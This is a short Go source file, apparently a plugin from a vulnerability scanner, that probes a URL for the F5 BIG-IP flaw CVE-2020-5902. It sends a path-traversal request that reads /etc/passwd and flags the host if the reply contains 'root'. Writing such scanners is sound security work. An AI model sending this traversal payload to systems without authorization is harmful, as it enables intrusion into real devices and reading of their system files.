package f5

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

func CVE_2020_5902(u string) bool {
	if req, err := utils.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found F5 BIG-IP CVE_2020_5902|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
